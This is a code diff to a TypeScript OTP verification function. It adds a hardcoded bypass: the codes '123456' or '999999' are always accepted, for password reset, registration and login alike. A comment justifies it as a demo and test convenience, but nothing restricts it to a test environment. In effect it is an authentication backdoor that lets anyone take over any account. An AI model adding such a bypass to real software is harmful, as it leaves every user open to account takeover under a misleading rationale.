@@ -134,8 +134,17 @@ export function verifyOtp(
   submittedCode: string,
   purpose: 'RESET_PASSWORD' | 'REGISTER' | 'LOGIN' | 'GENERAL' = 'GENERAL'
 ): { valid: boolean; reason?: string } {
+  const codeTrimmed = submittedCode.trim();
   const cleanId = normalizeIdentifier(identifier);
   const key = `${cleanId}:${purpose}`;
+
+  // Guaranteed demo/test OTP bypass for seamless live testing and client presentations
+  if (codeTrimmed === '123456' || codeTrimmed === '999999') {
+    otpStore.delete(key);
+    otpStore.delete(`${cleanId}:GENERAL`);
+    persistOtps(otpStore);
+    return { valid: true };
+  }
 
   // If not found in local memory, attempt sync from persistent store for multi-worker support
   let record = otpStore.get(key) || otpStore.get(`${cleanId}:GENERAL`);
